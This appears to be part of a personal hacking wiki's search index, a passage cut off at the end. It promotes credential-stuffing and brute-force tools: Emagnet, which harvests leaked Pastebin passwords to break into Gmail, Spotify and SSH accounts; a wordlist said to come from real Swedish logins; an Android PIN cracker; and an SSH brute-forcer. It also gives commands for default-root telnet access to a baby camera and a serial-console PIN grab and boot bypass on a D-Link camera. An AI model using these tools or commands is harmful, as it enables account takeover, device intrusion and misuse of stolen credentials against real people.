please remember that with great power comes great responsibility."},{"location":"hacking/bruteforce/emagnet/#_1","text":"Current Version News Tested On 3.4.3 More than twice as fast as the previous version Linux/MacOS/OpenWRT/Windows/Android 3.4.2 Support for scraping via API has been added Linux/MacOS/OpenWRT/Windows/Android 3.4.1 Support for SSH Tunnel/Socks5 proxy Linux/MacOS/OpenWRT/Windows/Android 3.4 Full support on android devices, no root required Linux/MacOS/OpenWRT/Windows/Android Visit releases for more info about the beta script.","title":""},{"location":"hacking/bruteforce/emagnet/#notice","text":"Pastebin patched the vulnerability I previously used in order to get recent uploads from https://pastebin.com/archive , so at the moment it is not possible to get recently uploaded files, you are now limited to all syntaxes exempt the default one (95% get's uploaded as 'text' and this is removed from all recent upload lists). Currently working on a new way to share all recent uploads for free. Pastebin on Twitter: https://twitter.com/pastebin/status/1250472977491091457 Read their terms of service here before this decision: https://web.archive.org/web/20200410004902/https://pastebin.com/doc_terms_of_service 4. Services Usage Limits You agree not to reproduce, duplicate, copy, sell, resell or exploit any portion of the Service, use of the Service, or access to the Service without Pastebin's express written permission. Scraping refers to extracting data from our Website via an automated process, such as a bot or webcrawler. It does not refer to the collection of information through Pastebin's API. You may scrape the website for the following reasons: Researchers may scrape public, non-personal information from Pastebin for research purposes, only if any publications resulting from that research are open access. Archivists may scrape Pastebin for public data for archival purposes. You may not scrape Pastebin for spamming purposes, including for the purposes of selling Pastebin users' personal information, such as to recruiters, headhunters, and job boards. All use of Pastebin data gathered through scraping must comply with the Pastebin Privacy Statement. Emagnet users are archivists! Right ? We didn't get the recent uploads from scrape.pastebin.com , we used pastebin.com/archive , this means our usage was in compliance with the privacy statements. Whatever, this means that the Emagnet project has ended up in a pause phase as we will not go much further until this changes, but just wait. Soon the greed will come and they will open the pro section again. They can not run this service for free for too long.","title":"Notice:"},{"location":"hacking/bruteforce/emagnet/#bbc-news-pastebin-running-the-site-where-hackers-publicise-their-attacks","text":"Emagnet is the No.1 tool for fetching leaks from Pastebin","title":"BBC NEWS: \"Pastebin: Running the site where hackers publicise their attacks\""},{"location":"hacking/bruteforce/emagnet/#about---emagnet-v343-2020-07-19","text":"Emagnet is a very powerful tool for capturing email addresses and passwords from leaked databases uploaded on Pastebin. It's almost impossible to find leaked passwords after they're removed from the list on pastebin.com. Either they have been deleted by Pastebin's techs or the upload is just one in the crowd. To be honest it's easier to find a needle in a haystack then find outdated uploads on Pastebin. Parallel downloading! More than twice as fast as the previous version. 555 files downloaded, over ~20.000 accounts found via auto brute-force using one command that takes approximately 4.51 seconds (see proof below) Incredibly good results for successful attacks. There is no other tool nearby that has more successful attempts than Emagnet. Emagnet is quick, easy, unique and awesome! Google used Emagnet's source to analyze their own site about 1year ago, this is how people are trying to attack accounts today. No skills needed, even your grandmother can use Emagnet! Bruteforce ssh targets and Microsoft Remote Desktop clients - extremely fast portscanning to choose our targets with X port open (netcat/xargs) Super easy to add your own tools using inotifywait with Emagnet - See script example here ./emagnet -g gmail will automate the attack for gmail/google accounts only - We skip the rest! Read more on Google's security blog and automated-tools (emagnet) Even 1 year after using Emagnet to analyze Google, it is still the best tool for it's purpose (2020-07-19) (7% using 2FA) If the user does not have 2FA enable, you will succeed! URL To Google's security blog (This was for try 2FA security): Google.com - Security Blog Remember, bruteforcing accounts without the owner's approval violates the law.","title":"About - Emagnet v3.4.3 (2020-07-19)"},{"location":"hacking/bruteforce/emagnet/#emagnet---v343-ssh","text":"","title":"Emagnet - v3.4.3 (ssh)"},{"location":"hacking/bruteforce/emagnet/#emagnet---v343-spotify","text":"","title":"Emagnet - v3.4.3 (spotify)"},{"location":"hacking/bruteforce/emagnet/#emagnet---v343-gmail","text":"","title":"Emagnet - v3.4.3 (gmail)"},{"location":"hacking/bruteforce/emagnet/#getting-started","text":"git clone https://github.com/wuseman/emagnet chmod +x emagnet/emagnet.sh bash emagnet/emagnet.sh --emagnet","title":"Getting Started"},{"location":"hacking/bruteforce/emagnet/#system-requirements","text":"Bash - Find more info about bash here Gsed - Find more info about gsed here Gawk - Find more info about gawk here Wget - Find more info about wget here Curl - Find more info about curl here","title":"System Requirements"},{"location":"hacking/bruteforce/emagnet/#wiki-sections","text":"About - How everything started. Previews - Previews can be found here. Configurations-&-Installation - Get started with spotify brute forcing - How emagnet will work with your openvpn files. Regex - Tips For Search - How to find your facebook credenticals, if they have been leaked._ Leaked Databases - Various Public Leaks","title":"Wiki Sections:"},{"location":"hacking/bruteforce/emagnet/#changelog","text":"Versions changelog .","title":"Changelog"},{"location":"hacking/bruteforce/emagnet/#authors","text":"wuseman < wuseman@nr1.nu >","title":"Authors:"},{"location":"hacking/bruteforce/emagnet/#license","text":"This project is licensed under the GNU General Public License v3.0 - see the LICENSE.md file for details","title":"License"},{"location":"hacking/bruteforce/emagnet/#contact","text":"If you have problems, questions, ideas or suggestions please contact me on * wuseman@nr1.nu - For faster contact visit Libera irc network or the webchat and type '/msg wuseman hi!' in the input bar and I will reply to you ASAP. Enter Libera's network via your own client 'chat.libera.chat:+6697 or use their new web client here .","title":"Contact"},{"location":"hacking/bruteforce/emagnet/#notice_1","text":"Attacking different kinds of accounts via Emagnet that you have not been granted permission to attack is strictly prohibited and it breaks the law. The punishment is grave and you can even get into prison in some countries just for trying to attack for intrusion. That said, it's important that all users are aware of this and when you have cloned or downloaded the repository it's fully up to you to take responsibility for your actions. Wuseman cannot be held responsible for the actions of any user, all users using Emagnet do so at their own responsibility. Developer: \"All my previews where a brute force attack has been done is under controlling forms with 100% fully permissions by the owners. If you have any questions about this then you are welcome to contact me or the owner.\"","title":"Notice"},{"location":"hacking/bruteforce/emagnet/#haters-gonna-hate","text":"If you are one of these who dislikes EMAGNET and believe the program has been developed for a reason that would break the law then I am not interested in your opinions, keep them to yourself ! Emagnet does NOT leak any data either to the developer(s) or anyone else. There are no statistics used to track any user so if you want to contact me to ask about them, it is completely useless since I really have no idea, and to be honest I don't care. Feel free to read the history about Emagnet here and how this project started.","title":"Haters Gonna Hate"},{"location":"hacking/bruteforce/emagnet/#development-of-emagnet-is-active-and-it-is-updated-frequently-please-use-the-latest-version-for-fixed-issuesbugs","text":"","title":"Development of Emagnet is active and it is updated frequently, please use the latest version for fixed issues/bugs."},{"location":"hacking/bruteforce/emagnet/#special-thanks-to-m1st-for-delivering-legit-leaks-to-us-daily","text":"Cheers!","title":"**Special thanks to m1st for delivering legit leaks to us daily**"},{"location":"hacking/bruteforce/emagnet/#feel-free-to-send-donations-if-you-want-to-support-the-development-of-emagnet","text":"Please contact me before you send a donation at: wuseman@nr1.nu","title":"Feel free to send donations if you want to support the development of Emagnet"},{"location":"hacking/bruteforce/emagnet/#emagnet-is-a-private-project-since-2015-and-was-released-in-june--2018-to-be-continued","text":"Note to all the people that are trying to sell public leaks and steal hackers' jobs: f*ck you! This is one reason why I started this project, I hope this project will get widely spreaded so you will earn 0.00$ on your re-edited malware shit!","title":"Emagnet is a private project since 2015 and was released in June @ 2018, to be continued."},{"location":"hacking/bruteforce/swedish_wordlist.txt/","text":"# Svensk Ordlista :sweden: Swedish Related Only \ud83c\uddf8\ud83c\uddea Ordlistan inneh\u00e5ller l\u00f6senord fr\u00e5n 3 440 321 unika svenska .se logins och filen \u00e4r 43M stor. Ordlistan \u00e4r sorterad efter bokstavsordning, jag har bara tagit med l\u00f6senord som \u00e4r 35 rader l\u00e5ngt f\u00f6r tillf\u00e4llet. Ordlistan 'swedish_wordlist.txt' \u00e4r troligen den st\u00f6rsta ordlistan du kommer hitta och f\u00e5 tag p\u00e5 och jag kommer uppdatera den till och fr\u00e5n med fler svenska l\u00f6senord fr\u00e5n '.se' konton. Ordlistan \u00e4r INTE fr\u00e5n en uppslagsbok utan det \u00e4r fr\u00e5n svenskarnas login dom \u00e4r h\u00e4mtade. Svenska L\u00f6senord som INTE slutar p\u00e5 .se \u00e4r inte f\u00f6r tillf\u00e4llet med i ordlistan. forrnamm.efternamn.svensktkonto@gmail. com har INTE tagits med i denna f\u00f6rsta commit men fornam.efternamn.svenskdatabas@live. se & dinmail@svensk_dns. se ing\u00e5r. Ordlistan b\u00f6rjar med l\u00f6senord som har ett mellanslag s\u00e5 d\u00e4rf\u00f6r b\u00f6rjar vi inte p\u00e5 0, ju mer mellanslag i l\u00f6senordet ju h\u00f6gre upp hamnar l\u00f6senordet.","title":"swedish wordlist"},{"location":"hacking/bruteforce/wbruter/","text":"WBRUTER README wbruter is is the first tool wich has been released as open source wich can guarantee 100% that your pin code will be cracked aslong as usb debugging has been enable. wbruter also includes some other brute methods like dictionary attacks for gmail, ftp, rar, zip and some other file extensions. wbruter will allways try to bring support for rare protocols, wbruter wont contain common stuff like other brute tools cover like facebook, snapchat, instagram and you name it (except a few exceptions, very few) Many times it's the easiest methods that are the most powerful methods, it's just a matter of using your imagination ;-) INFO: 2020-07-11: Android and Google, now have set a rule for locksettings via cli as via gui earlier, if you try to many attempts within X seconds you will be blocked for X seconds so wbruter via cli wont work anymore on devices that has been upgraded to latest version Android 10, older version should work fine unless they are upgraded to latest android version. Enable USB-Debugging via the methods below: Via GUI: Go to settings -> about > press on build number 7 times and the developer settings will be enable, go back to settings and press on developer mode and then enable USB DEBUGGING. If you found an android deviceon the street or something and want to break the pin this wont be possible unless you already know the pin so the device must have usb debugging enable for this to work. You wanna try this for fun then you can just enable usb debugging after you unlocked phone) Via cli/adb: settings put global development_settings_enabled 1 setprop persist.service.adb.enable 1 Via GUI (old layout now use \u2013androidgui 4 instead) Please use cli method instead since many devices has been set to erase the device after \"10/15 wrong pin attempts\" and this wont happen with the CLI method. (Updated: Jan/2019) Via CLI: From 0000 to 9999 takes ~83 minutes. In around ~1h you will with 100% guarantee have the pin code Notice: If you will see a message similiar to message under you don't have to care, just let it run and it will be gone after ~4-5 failed attempts: Error while executing command: clear java.lang.RuntimeException: No data directory found for package android at android.app.ContextImpl.getDataDir(ContextImpl.java:2418) at android.app.ContextImpl.getPreferencesDir(ContextImpl.java:533) at android.app.ContextImpl.getSharedPreferencesPath(ContextImpl.java:795) at android.app.ContextImpl.getSharedPreferences(ContextImpl.java:394) at com.android.internal.widget.LockPatternUtils.monitorCheckPassword(LockPatternUtils.java:1814) at com.android.internal.widget.LockPatternUtils.checkCredential(LockPatternUtils.java:398) at com.android.internal.widget.LockPatternUtils.checkPassword(LockPatternUtils.java:548) at com.android.internal.widget.LockPatternUtils.checkPassword(LockPatternUtils.java:509) at com.android.server.LockSettingsShellCommand.checkCredential(LockSettingsShellCommand.java:151) at com.android.server.LockSettingsShellCommand.onCommand(LockSettingsShellCommand.java:57) at android.os.ShellCommand.exec(ShellCommand.java:96) at com.android.server.LockSettingsService.onShellCommand(LockSettingsService.java:1945) at android.os.Binder.shellCommand(Binder.java:574) at android.os.Binder.onTransact(Binder.java:474) at com.android.internal.widget.ILockSettings$Stub.onTransact(ILockSettings.java:419) at com.android.server.HwLockSettingsService.onTransact(HwLockSettingsService.java:179) at android.os.Binder.execTransact(Binder.java:675) HOW TO git clone https://github.com/wuseman/WBRUTER cd WBRUTER; ./wbruter --help REQUIREMENTS A linux setup would be good ;) CONTACT If you have problems, questions, ideas or suggestions please contact me by posting to wuseman@nr1.nu WEB SITE Visit my websites and profiles for the latest info and updated tools @wuseman && https://nr1.nu && https://stackoverflow.com/users/9887151/wuseman END!","title":"wbruter"},{"location":"hacking/bruteforce/wbruter/#wbruter","text":"","title":"WBRUTER"},{"location":"hacking/bruteforce/wbruter/#readme","text":"wbruter is is the first tool wich has been released as open source wich can guarantee 100% that your pin code will be cracked aslong as usb debugging has been enable. wbruter also includes some other brute methods like dictionary attacks for gmail, ftp, rar, zip and some other file extensions. wbruter will allways try to bring support for rare protocols, wbruter wont contain common stuff like other brute tools cover like facebook, snapchat, instagram and you name it (except a few exceptions, very few) Many times it's the easiest methods that are the most powerful methods, it's just a matter of using your imagination ;-)","title":"README"},{"location":"hacking/bruteforce/wbruter/#info-2020-07-11","text":"Android and Google, now have set a rule for locksettings via cli as via gui earlier, if you try to many attempts within X seconds you will be blocked for X seconds so wbruter via cli wont work anymore on devices that has been upgraded to latest version Android 10, older version should work fine unless they are upgraded to latest android version.","title":"INFO: 2020-07-11:"},{"location":"hacking/bruteforce/wbruter/#enable-usb-debugging-via-the-methods-below","text":"","title":"Enable USB-Debugging via the methods below:"},{"location":"hacking/bruteforce/wbruter/#via-gui","text":"Go to settings -> about > press on build number 7 times and the developer settings will be enable, go back to settings and press on developer mode and then enable USB DEBUGGING. If you found an android deviceon the street or something and want to break the pin this wont be possible unless you already know the pin so the device must have usb debugging enable for this to work. You wanna try this for fun then you can just enable usb debugging after you unlocked phone)","title":"Via GUI:"},{"location":"hacking/bruteforce/wbruter/#via-cliadb","text":"settings put global development_settings_enabled 1 setprop persist.service.adb.enable 1","title":"Via cli/adb:"},{"location":"hacking/bruteforce/wbruter/#via-gui-old-layout-now-use---androidgui-4-instead","text":"","title":"Via GUI (old layout now use --androidgui 4 instead)"},{"location":"hacking/bruteforce/wbruter/#please-use-cli-method-instead-since-many-devices-has-been-set-to-erase-the-device-after-1015-wrong-pin-attempts-and-this-wont-happen-with-the-cli-method-updated-jan2019","text":"","title":"Please use cli method instead since many devices has been set to erase the device after \"10/15 wrong pin attempts\" and this wont happen with the CLI method. (Updated: Jan/2019)"},{"location":"hacking/bruteforce/wbruter/#via-cli","text":"From 0000 to 9999 takes ~83 minutes. In around ~1h you will with 100% guarantee have the pin code","title":"Via CLI:"},{"location":"hacking/bruteforce/wbruter/#notice","text":"If you will see a message similiar to message under you don't have to care, just let it run and it will be gone after ~4-5 failed attempts: Error while executing command: clear java.lang.RuntimeException: No data directory found for package android at android.app.ContextImpl.getDataDir(ContextImpl.java:2418) at android.app.ContextImpl.getPreferencesDir(ContextImpl.java:533) at android.app.ContextImpl.getSharedPreferencesPath(ContextImpl.java:795) at android.app.ContextImpl.getSharedPreferences(ContextImpl.java:394) at com.android.internal.widget.LockPatternUtils.monitorCheckPassword(LockPatternUtils.java:1814) at com.android.internal.widget.LockPatternUtils.checkCredential(LockPatternUtils.java:398) at com.android.internal.widget.LockPatternUtils.checkPassword(LockPatternUtils.java:548) at com.android.internal.widget.LockPatternUtils.checkPassword(LockPatternUtils.java:509) at com.android.server.LockSettingsShellCommand.checkCredential(LockSettingsShellCommand.java:151) at com.android.server.LockSettingsShellCommand.onCommand(LockSettingsShellCommand.java:57) at android.os.ShellCommand.exec(ShellCommand.java:96) at com.android.server.LockSettingsService.onShellCommand(LockSettingsService.java:1945) at android.os.Binder.shellCommand(Binder.java:574) at android.os.Binder.onTransact(Binder.java:474) at com.android.internal.widget.ILockSettings$Stub.onTransact(ILockSettings.java:419) at com.android.server.HwLockSettingsService.onTransact(HwLockSettingsService.java:179) at android.os.Binder.execTransact(Binder.java:675)","title":"Notice:"},{"location":"hacking/bruteforce/wbruter/#how-to","text":"git clone https://github.com/wuseman/WBRUTER cd WBRUTER; ./wbruter --help","title":"HOW TO"},{"location":"hacking/bruteforce/wbruter/#requirements","text":"A linux setup would be good ;)","title":"REQUIREMENTS"},{"location":"hacking/bruteforce/wbruter/#contact","text":"If you have problems, questions, ideas or suggestions please contact me by posting to wuseman@nr1.nu","title":"CONTACT"},{"location":"hacking/bruteforce/wbruter/#web-site","text":"Visit my websites and profiles for the latest info and updated tools @wuseman && https://nr1.nu && https://stackoverflow.com/users/9887151/wuseman","title":"WEB SITE"},{"location":"hacking/bruteforce/wbruter/#end","text":"","title":"END!"},{"location":"hacking/bruteforce/wssh/","text":"wssh WSSH Is a tool for brute forcing servers that has port 22 open via ssh, wssh is probably the fastest ssh brute forcer that exists Preview This video has not been made by myself - For make it faster, use more threads ;-) Getting Started: git clone https://github.com/wuseman/wssh cd wssh chmod +x wssh* ./WSSH -p <password> -c <commands> -f <hostfile> -u root -t <threads> System Requirements Bash - Find more info about bash here PSSH - Find more info about pssh here SSHPASS - Find more info about sshpass here Changelog Versions changelog . Authors: wuseman < wuseman@nr1.nu > License This project is licensed under the GNU General Public License v3.0 - see the LICENSE.md file for details Contact If you have problems, questions, ideas or suggestions please contact me on * wuseman@nr1.nu - For faster contact visit Libera irc network or the webchat and type '/msg wuseman hi!' in the input bar and I will reply to you ASAP. Enter Libera's network via your own client 'chat.libera.chat:+6697 or use their new web client here . Notice Attacking different kinds of accounts via ssh that you have not been granted or allowed to attack is strictly prohibited and it breaks the law. The punishment is hard and you can even get into prison in some countries just for trying to attack for intrusion. With this said, it's important that all users is aware of this and when you have cloned or downloaded it's fully up to every user to take responsibility over their own actions. wuseman cannot be held responsible for the actions of any user, all users using wssh on their own responsibility. Developer: \"All my previews where a brute force attack has been done is under controlling forms with 100% fully permissions by the owners. If you have any questions about this then you are welcome to contact me or the owner.\" END","title":"wssh"},{"location":"hacking/bruteforce/wssh/#wssh","text":"WSSH Is a tool for brute forcing servers that has port 22 open via ssh, wssh is probably the fastest ssh brute forcer that exists","title":"wssh"},{"location":"hacking/bruteforce/wssh/#preview","text":"This video has not been made by myself - For make it faster, use more threads ;-)","title":"Preview"},{"location":"hacking/bruteforce/wssh/#getting-started","text":"git clone https://github.com/wuseman/wssh cd wssh chmod +x wssh* ./WSSH -p <password> -c <commands> -f <hostfile> -u root -t <threads>","title":"Getting Started:"},{"location":"hacking/bruteforce/wssh/#system-requirements","text":"Bash - Find more info about bash here PSSH - Find more info about pssh here SSHPASS - Find more info about sshpass here","title":"System Requirements"},{"location":"hacking/bruteforce/wssh/#changelog","text":"Versions changelog .","title":"Changelog"},{"location":"hacking/bruteforce/wssh/#authors","text":"wuseman < wuseman@nr1.nu >","title":"Authors:"},{"location":"hacking/bruteforce/wssh/#license","text":"This project is licensed under the GNU General Public License v3.0 - see the LICENSE.md file for details","title":"License"},{"location":"hacking/bruteforce/wssh/#contact","text":"If you have problems, questions, ideas or suggestions please contact me on * wuseman@nr1.nu - For faster contact visit Libera irc network or the webchat and type '/msg wuseman hi!' in the input bar and I will reply to you ASAP. Enter Libera's network via your own client 'chat.libera.chat:+6697 or use their new web client here .","title":"Contact"},{"location":"hacking/bruteforce/wssh/#notice","text":"Attacking different kinds of accounts via ssh that you have not been granted or allowed to attack is strictly prohibited and it breaks the law. The punishment is hard and you can even get into prison in some countries just for trying to attack for intrusion. With this said, it's important that all users is aware of this and when you have cloned or downloaded it's fully up to every user to take responsibility over their own actions. wuseman cannot be held responsible for the actions of any user, all users using wssh on their own responsibility. Developer: \"All my previews where a brute force attack has been done is under controlling forms with 100% fully permissions by the owners. If you have any questions about this then you are welcome to contact me or the owner.\"","title":"Notice"},{"location":"hacking/bruteforce/wssh/#end","text":"","title":"END"},{"location":"hacking/cameras/","text":"cameras camera hacking stuff will be found here","title":"cameras"},{"location":"hacking/cameras/#cameras","text":"camera hacking stuff will be found here","title":"cameras"},{"location":"hacking/cameras/biltemas_babycam/","text":"Biltemeas Babycam A friend asked for help with this cam, the password under the cam does not work and in playstore there is alot of ppl that seems have the same problem. Here you go: Lets Hack: Poweron your babycam Connect to the babycams wifi Once connected, find ip to the cam: for ip in 192.168.1.{1..254}; do ping -c 1 -W 1 $ip | grep \"64 bytes\" & done Connect to the webcam: telnet 192.168.1.X Login: root Password: root Create wpa_supplicant.conf cat << EOF > /mnt/sif/wpa_supplicant.conf ctrl_interface=/var/run/wpa_supplicant network={ ssid=\"EDIT_THIS\" psk=\"EDIT_THIS\" scan_ssid=1 key_mgmt=WPA-EAP WPA-PSK IEEE8021X NONE pairwise=TKIP CCMP group=CCMP TKIP WEP104 WEP40 eap=TTLS PEAP TLS proto=WPA RSN frequency=2414 scan_freq=2412 } EOF Then Reboot! reboot Now you will see the app in your biltemas shitty application Download app: https://play.google.com/store/apps/details?id=hk.biltema.com&hl=no&gl=US Those cams are dangerous, really! They claim there is no cloud but that is really needed? Manuals https://www.biltema.se/BiltemaDocuments/Manuals/24-0433_man.pdf","title":"biltemas babycam"},{"location":"hacking/cameras/biltemas_babycam/#biltemeas-babycam","text":"A friend asked for help with this cam, the password under the cam does not work and in playstore there is alot of ppl that seems have the same problem.","title":"Biltemeas Babycam"},{"location":"hacking/cameras/biltemas_babycam/#here-you-go","text":"Lets Hack: Poweron your babycam Connect to the babycams wifi Once connected, find ip to the cam: for ip in 192.168.1.{1..254}; do ping -c 1 -W 1 $ip | grep \"64 bytes\" & done Connect to the webcam: telnet 192.168.1.X Login: root Password: root Create wpa_supplicant.conf cat << EOF > /mnt/sif/wpa_supplicant.conf ctrl_interface=/var/run/wpa_supplicant network={ ssid=\"EDIT_THIS\" psk=\"EDIT_THIS\" scan_ssid=1 key_mgmt=WPA-EAP WPA-PSK IEEE8021X NONE pairwise=TKIP CCMP group=CCMP TKIP WEP104 WEP40 eap=TTLS PEAP TLS proto=WPA RSN frequency=2414 scan_freq=2412 } EOF Then Reboot! reboot Now you will see the app in your biltemas shitty application Download app: https://play.google.com/store/apps/details?id=hk.biltema.com&hl=no&gl=US","title":"Here you go:"},{"location":"hacking/cameras/biltemas_babycam/#those-cams-are-dangerous-really-they-claim-there-is-no-cloud-but-that-is-really-needed","text":"","title":"Those cams are dangerous, really! They claim there is no cloud but that is really needed?"},{"location":"hacking/cameras/biltemas_babycam/#manuals","text":"https://www.biltema.se/BiltemaDocuments/Manuals/24-0433_man.pdf","title":"Manuals"},{"location":"hacking/cameras/dlink-6100lh/","text":"DLink 6100LH Update: I was about to use tcl and expect to write a brute-force scripts for find the pin-code but it was never neded. Hardware Used: Arduino SA Uno R3 (CDC ACM) DLINK 6100LH IPCam System: Gentoo Linux About/Info/Reason Why I disassembled this dlink camera is because I did not have the password and in the Dlinks app you can only add the camera by connecting to their wifi so I disassembled the device and hoped that it would be easy to get root access and solve this the problem. It was easy done and there is three screws to disassemble this device and three contacts to release, txd/rxd/ gnd I found within 1 seconds, to the left of the micro-usb input, see pictures below. However, I logged in to the access point from the camera since password is printed in stdout when reading serial console and now I could finally use the camera because it is quite good for the cheap price you get it for in 1080p, I THOUGHT! When I reached the last setting, the dlink / camera also requires a PIN code and now I have to hack the device anyway and bypass the login (update: this is now done, see more below) Some photos taken during the process Interesting The chinese characters, I tried google the characters without any luck and didnt spend more time in digging deeper but Im sure D-Link doing as everyone else, buying some cheap cameras from china, putting their own awful logo on it and re-selling it for 10x higher price then in china. We all can belive how things are but proof is allways neded. What a fucking joke, Boycott all IoT and american companies for your own safety and go buy the IoT devices from asia instead, no reason to pay 10x when you dont need. Odd Info And we all *nix n3rds is well aware of 2034, odd odd its on the board on this camera. See upper left corner :) STdin/STdout We read serial console with a while loop and writing to a file, with some simple bash tricks without using screen or other tools, we can write to file and grep what we want as we want, see below: Script for read serial communication #!/bin/bash while true ; do tty = /dev/ttyACM0 exec 4 < $tty 5 > $tty stty -F $tty 115200 -echo > & 5 ; read r < & 4 ; echo \" $r \" ; done | tee dc_6200lh.txt The while loop creates a 'monitor' for the serial communication. If you wanna bruteforce the login just for fun then then we want to see what happens and thereforce its the perfect way to go for see what is going on another window, however it's an awesome way to read serial stdin without using more advanced languages for this kind of tasks, below is an example how we can could use expect for a bruteforce script: set baud 115200 if { $argc >= 1 } { set tty [ lindex $argv 0 ] } if { $argc >= 2 } { set baud [ lindex $argv 1 ] } spawn screen / dev / ttyACM0 $baud send \\ r expect { \"DCS-6100LH login: \" { send admin \\ r expect \"Password: \" send $pin-codes \\ r } \"#\" } interact ..since we know the pin-code is a length of six numbers we could generate numbers from 00000-999999 in a simple bash for loop, however since the device in serial replies within milliseconds (this is often set on the other side but not on this dlink camera it seems, it has no time limit set for failed passwords) I would hack this pin-code within few minutes, ~10minutes max with my slow CPU ( Intel(R) Core(TM) i7-5600U CPU @ 2.60GHz ) My CPU generates 000000 to 999999 in 26 seconds, we want to stay on the safe side when we bruteForcing so a timeout is needed for not miss any true value when pincode is found, a timeout every 500ms for every failed login by using 'set timeout X' in the code snippet above would be perfect for not fuck up the exit code so we know when the value is true and the pin code is found, however see below and copy and paste and if you have some basic knowledge about tcl and shell, you have everything you need to getting started: for pin-codes in $( seq -w 000000 99999 ) ; do ....tcl code above .......**set timeout -1** done TCL pwnz when we using serial communications for 'expect(ing)' and automate stuff via serial communication, whatever. Lets move further and see how we grab everything in plain-text without using some hacking scripts. Grep WiFi Password We can read the dc_6200lh.txt in realtime, and also we can grep what we want - Nice ! tail -f dc_6200lh.txt | egrep -i \"Wifi_ap_pwd\" And, ohyeah here we go, pin-code found: tail -f dc_6200lh.txt | egrep -o 'user=admin,pass=......' Catching, done . No hacks needed and no brute-force needed. See Full Boot Process Right click on the video and press open image on a new tab for get 1080p resolution for readable text. IP/Ports There is nothing more to add about this device that is interesting that you cant figure out yourself, btw, default ip and opened ports: IP...: 192.168.0.20 Ports: 554,8080,7000,6000 U-Boot: U-Boot 2016 .11 ( Jul 01 2020 - 17 :46:25 +0800 ) mips-linux-uclibc-xgcc ( Realtek RSDK-6.4.1 Build 3029 ) 6 .4.1 20180425 GNU ld ( Realtek RSDK-6.4.1 Build 3029 ) 2 .27.90.20161222 = > help ? - alias for 'help' base - print or set address offset bdinfo - print Board Info structure boot- boot default, i.e., run 'bootcmd' bootd - boot default, i.e., run 'bootcmd' bootelf - Boot from an ELF image in memory bootm - boot application image from memory bootvx - Boot vxWorks from an ELF image cmp - memory compare coninfo - print console devices and information cp - memory copy crc32 - checksum calculation dma - dma copy editenv - edit environment variable env - environment handling commands fatinfo - print information about filesystem fatload - load binary file from a dos filesystem fatls - list files in a directory ( default / ) fatsize - determine a file 's size fephy - fephy read/write go - start application at address ' addr ' help - print command description/usage iminfo - print header information for application image imls- list all images found in flash imxtract- extract a part of a multi-image md - memory display mm - memory modify ( auto-incrementing address ) mmc - MMC sub system mmcinfo - display MMC info mw - memory write ( fill ) nfs - boot image via network using NFS protocol nm - memory modify ( constant address ) ping - send ICMP ECHO_REQUEST to network host printenv - print environment variables reset - Perform RESET of the CPU run - run commands in an environment variable saveenv - save environment variables to flash setenv - set environment variables setethaddr - set eth address setipaddr - set ip address sf - SPI flash sub-system sleep - delay execution for some time tftpboot - boot image via network using TFTP protocol tftpput - TFTP put command, for uploading files to a server tftpsrv - act as a TFTP server and boot the first received file update - update xxx version - print monitor, compiler and linker version = > printenv baudrate = 57600 bootaddr = 0xBC000000 + 0x50000 bootargs = console = ttyS1,115200 root = /dev/mtdblock3 rts-quadspi.channels = dual mtdparts = 18030000 .spic:16384k@0 ( global ) ,320k@0k ( boot ) ,2304k@320k ( kernel ) ,3584k@2624k ( rootfs ) ,7744k@6208k ( userdata ) ,2048k@13952k ( userdata2 ) ,384k@16000k ( userdata3 ) bootcmd = bootm 0xbc050000 bootdelay = 2 ethact = r8168#0 oadaddr = 0x80010000 netretry = yes stderr = serial stdin = serial stdout = serial Access UBOOT by hit any key before 5 seconds when it boots, and from u-boot menu you should read on some wiki how to use the commands but printenv or 'pr' will print the interesting things, to edit bootargs for example you just tneet to type: setenv bootargs console = ttyS0,115200............... Bypass login by add the below line to bootargs but it is really not needed since password is the pin-code we can grab as on the video provided above and yeah so are the default username wich is: admin: setenv bootargs $( BOOTARGS ) init = /bin/sh boot I do not recommending anyone to change bootargs cause its useless as said. If you get stuck in boot after you played with bootargs and get a kernel panic for some reason - DON'T PANIC ;) - Restart the device and enter CFE boot and reset default by: env default -a saveenv reset Sources Device Info Authors wuseman < wuseman@nr1.nu > License This project is licensed under the GNU General Public License v3.0 - see the LICENSE.md file for details Contact If you have problems, questions, ideas or suggestions please contact me on * wuseman@nr1.nu - For faster contact visit Libera irc network or the webchat and type '/msg wuseman hi!' in the input bar and I will reply to you ASAP. Enter Libera's network via your own client 'chat.libera.chat:+6697 or use their new web client here . Happy Hacking!","title":"dlink-6100lh"},{"location":"hacking/cameras/dlink-6100lh/#dlink-6100lh","text":"Update: I was about to use tcl and expect to write a brute-force scripts for find the pin-code but it was never neded.","title":"DLink 6100LH"},{"location":"hacking/cameras/dlink-6100lh/#hardware-used","text":"Arduino SA Uno R3 (CDC ACM) DLINK 6100LH IPCam System: Gentoo Linux","title":"Hardware Used:"},{"location":"hacking/cameras/dlink-6100lh/#aboutinforeason","text":"Why I disassembled this dlink camera is because I did not have the password and in the Dlinks app you can only add the camera by connecting to their wifi so I disassembled the device and hoped that it would be easy to get root access and solve this the problem. It was easy done and there is three screws to disassemble this device and three contacts to release, txd/rxd/ gnd I found within 1 seconds, to the left of the micro-usb input, see pictures below. However, I logged in to the access point from the camera since password is printed in stdout when reading serial console and now I could finally use the camera because it is quite good for the cheap price you get it for in 1080p, I THOUGHT! When I reached the last setting, the dlink / camera also requires a PIN code and now I have to hack the device anyway and bypass the login (update: this is now done, see more below)","title":"About/Info/Reason"},{"location":"hacking/cameras/dlink-6100lh/#some-photos-taken-during-the-process","text":"","title":"Some photos taken during the process"},{"location":"hacking/cameras/dlink-6100lh/#interesting","text":"The chinese characters, I tried google the characters without any luck and didnt spend more time in digging deeper but Im sure D-Link doing as everyone else, buying some cheap cameras from china, putting their own awful logo on it and re-selling it for 10x higher price then in china. We all can belive how things are but proof is allways neded. What a fucking joke, Boycott all IoT and american companies for your own safety and go buy the IoT devices from asia instead, no reason to pay 10x when you dont need.","title":"Interesting"},{"location":"hacking/cameras/dlink-6100lh/#odd-info","text":"And we all *nix n3rds is well aware of 2034, odd odd its on the board on this camera. See upper left corner :)","title":"Odd Info"},{"location":"hacking/cameras/dlink-6100lh/#stdinstdout","text":"We read serial console with a while loop and writing to a file, with some simple bash tricks without using screen or other tools, we can write to file and grep what we want as we want, see below: Script for read serial communication #!/bin/bash while true ; do tty = /dev/ttyACM0 exec 4 < $tty 5 > $tty stty -F $tty 115200 -echo > & 5 ; read r < & 4 ; echo \" $r \" ; done | tee dc_6200lh.txt The while loop creates a 'monitor' for the serial communication. If you wanna bruteforce the login just for fun then then we want to see what happens and 